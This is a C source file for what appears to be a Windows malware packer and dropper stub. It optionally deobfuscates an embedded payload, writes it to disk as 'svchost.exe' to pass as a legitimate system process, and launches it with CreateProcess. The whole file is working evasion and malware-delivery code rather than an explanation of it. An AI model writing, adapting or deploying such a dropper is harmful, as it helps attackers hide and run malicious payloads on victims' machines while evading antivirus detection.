#include <stdio.h>
#include <windows.h>

#include "payload.h"

#ifdef OBFUSCATE
#include "../obfuscation/obfuscate.h"
#endif

__attribute__((section("packyou")))
int unpack()
{
	SIZE_T size = (SIZE_T)FILE_SIZE;
	BYTE *base;

#ifdef OBFUSCATE
	base = deobfuscate(payload, size, (SIZE_T)REAL_SIZE);
	if (base == NULL)
		return GetLastError();
	size = (SIZE_T)REAL_SIZE;
#else
	base = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
	if (base == NULL)
		return GetLastError();
	memcpy(base, payload, size);
#endif

	HANDLE file =
		CreateFile("svchost.exe", GENERIC_WRITE | GENERIC_READ, 0, NULL,
			   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (file == INVALID_HANDLE_VALUE)
		return GetLastError();

	DWORD written = 0;
	BOOL write_ok = WriteFile(file, base, size, &written, NULL);
	CloseHandle(file);

	if (!write_ok)
		return GetLastError();

#ifdef OBFUSCATE
	if (!clean(base))
		return GetLastError();
#else
	if (!VirtualFree(base, 0, MEM_RELEASE))
		return GetLastError();
#endif

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (CreateProcess("svchost.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL,
			  &si, &pi) == 0)
		return GetLastError();

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return ERROR_SUCCESS;
}

__attribute__((section("packyou")))
int main()
{
	int ret = unpack();

	if (ret != ERROR_SUCCESS)
		printf("Error %d\n", ret);

	return ret;
}
